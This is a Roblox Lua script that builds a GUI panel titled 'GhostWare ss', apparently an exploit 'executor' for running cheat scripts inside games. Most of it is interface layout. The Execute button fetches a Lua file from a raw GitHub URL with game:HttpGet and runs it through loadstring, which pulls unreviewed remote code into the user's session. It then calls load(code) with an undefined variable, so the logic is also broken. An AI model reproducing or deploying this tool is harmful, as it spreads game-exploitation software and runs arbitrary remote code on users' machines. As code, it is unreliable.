local GhostWareExecutor = Instance.new("ScreenGui")
local Topbar = Instance.new("Frame")
local Frame = Instance.new("Frame")
local ScriptBox = Instance.new("ScrollingFrame")
local TextBox = Instance.new("TextBox")
local iuanoLd = Instance.new("ImageLabel")
local Executor = Instance.new("TextButton")
local Clear = Instance.new("TextButton")
local Title = Instance.new("TextLabel")
local Icon = Instance.new("ImageLabel")

GhostWareExecutor.Name = "GhostWareExecutor"
GhostWareExecutor.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
GhostWareExecutor.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
GhostWareExecutor.ResetOnSpawn = false

Topbar.Name = "Topbar"
Topbar.Parent = GhostWareExecutor
Topbar.Active = true
Topbar.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
Topbar.BorderSizePixel = 0
Topbar.Position = UDim2.new(0.0998463929, 0, 0.0876897126, 0)
Topbar.Size = UDim2.new(0.800000012, 0, 0.100000001, 0)

Frame.Parent = Topbar
Frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(-0.0003491026, 0, 0.996627152, 0)
Frame.Size = UDim2.new(1.00034916, 0, 6.49123192, 0)

ScriptBox.Name = "ScriptBox"
ScriptBox.Parent = Frame
ScriptBox.Active = true
ScriptBox.BackgroundColor3 = Color3.fromRGB(117, 117, 117)
ScriptBox.BackgroundTransparency = 0.500
ScriptBox.BorderSizePixel = 0
ScriptBox.Position = UDim2.new(0.0989390984, 0, 0, 0)
ScriptBox.Size = UDim2.new(0.899999976, 0, 1, 0)
ScriptBox.HorizontalScrollBarInset = Enum.ScrollBarInset.Always
ScriptBox.VerticalScrollBarInset = Enum.ScrollBarInset.Always

TextBox.Parent = ScriptBox
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1.000
TextBox.BorderSizePixel = 0
TextBox.LayoutOrder = 1
TextBox.Size = UDim2.new(0.980000019, 0, 1000, 0)
TextBox.ClearTextOnFocus = false
TextBox.Font = Enum.Font.Code
TextBox.MultiLine = true
TextBox.PlaceholderColor3 = Color3.fromRGB(127, 127, 127)
TextBox.PlaceholderText = "Put script here..."
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(0, 0, 255)
TextBox.TextSize = 18.000
TextBox.TextStrokeColor3 = Color3.fromRGB(0, 0, 127)
TextBox.TextStrokeTransparency = 0.000
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top

iuanoLd.Name = "iuanoLd"
iuanoLd.Parent = Frame
iuanoLd.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
iuanoLd.BackgroundTransparency = 1.000
iuanoLd.Position = UDim2.new(0.100160562, 0, 0, 0)
iuanoLd.Size = UDim2.new(0.899839461, 0, 1, 0)
iuanoLd.Image = "rbxassetid://10335532971"
iuanoLd.ImageTransparency = 0.700
iuanoLd.ScaleType = Enum.ScaleType.Crop
iuanoLd.SliceScale = 0.000

Executor.Name = "Executor"
Executor.Parent = Frame
Executor.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Executor.BorderColor3 = Color3.fromRGB(48, 48, 48)
Executor.BorderSizePixel = 0
Executor.Size = UDim2.new(0.0989390537, 0, 0.246616378, 0)
Executor.Font = Enum.Font.GothamMedium
Executor.Text = "✔️Execute"
Executor.TextColor3 = Color3.fromRGB(0, 0, 255)
Executor.TextScaled = true
Executor.TextSize = 14.000
Executor.TextStrokeColor3 = Color3.fromRGB(0, 0, 127)
Executor.TextStrokeTransparency = 0.000
Executor.TextWrapped = true

Clear.Name = "Clear"
Clear.Parent = Frame
Clear.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Clear.BorderColor3 = Color3.fromRGB(48, 48, 48)
Clear.BorderSizePixel = 0
Clear.Position = UDim2.new(0, 0, 0.267581075, 0)
Clear.Size = UDim2.new(0.0989390537, 0, 0.246616378, 0)
Clear.Font = Enum.Font.GothamMedium
Clear.Text = "❌Clear"
Clear.TextColor3 = Color3.fromRGB(0, 0, 255)
Clear.TextScaled = true
Clear.TextSize = 14.000
Clear.TextStrokeColor3 = Color3.fromRGB(0, 0, 127)
Clear.TextStrokeTransparency = 0.000
Clear.TextWrapped = true

Title.Name = "Title"
Title.Parent = Topbar
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(0.23093845, 0, 0, 0)
Title.Size = UDim2.new(0.754398823, 0, 1, 0)
Title.Font = Enum.Font.GothamMedium
Title.Text = "GhostWare ss"
Title.TextColor3 = Color3.fromRGB(0, 0, 127)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextStrokeColor3 = Color3.fromRGB(0, 0, 255)
Title.TextStrokeTransparency = 0.000
Title.TextWrapped = true
Title.TextXAlignment = Enum.TextXAlignment.Right

Icon.Name = "Icon"
Icon.Parent = Topbar
Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Icon.BackgroundTransparency = 1.000
Icon.BorderSizePixel = 0
Icon.Size = UDim2.new(0.0751990229, 0, 1, 0)
Icon.Image = "rbxassetid://10335532971"
Icon.ScaleType = Enum.ScaleType.Fit

local function CMRMLK_fake_script() -- Executor.LocalScript
    local script = Instance.new("Script", Executor)

    script.Parent.MouseButton1Click:Connect(
        function()
            local load =
                loadstring(
                game:HttpGet(
                    "https://raw.githubusercontent.com/frayray909090/No-Roblox-staff/main/LuaSources/Loadstring.lua"
                )
            )()
            load(code)
        end
    )
end
coroutine.wrap(CMRMLK_fake_script)()
local function JAKGMU_fake_script() -- Clear.LocalScript
    local script = Instance.new("LocalScript", Clear)

    script.Parent.MouseButton1Click:Connect(
        function()
            script.Parent.Parent.ScriptBox.TextBox.Text = ""
            script.Parent.Text = "Cleared!"
            script.Parent.TextColor3 = Color3.fromHex("#be0000")
        end
    )
end
coroutine.wrap(JAKGMU_fake_script)()
local function QFQTMCN_fake_script() -- Clear.RemoveClear
    local script = Instance.new("LocalScript", Clear)

    while wait() do
        script.Parent.Text = "❌Clear"
        script.Parent.TextColor3 = Color3.fromHex("#0000ff")
        wait(3)
    end
end
coroutine.wrap(QFQTMCN_fake_script)()
local function DIZS_fake_script() -- Topbar.Draggability
    local script = Instance.new("LocalScript", Topbar)

    script.Parent.Draggable = true
end
coroutine.wrap(DIZS_fake_script)()
local function OTOYJEV_fake_script() -- Topbar.Deletion
    local script = Instance.new("LocalScript", Topbar)

    game:GetService("UserInputService").InputBegan:Connect(
        function(key)
            if key.KeyCode == Enum.KeyCode.RightShift then
                if script.Parent.Visible == true then
                    script.Parent.Visible = false
                else
                    script.Parent.Visible = true
                end
            end
        end
    )
end
coroutine.wrap(OTOYJEV_fake_script)()
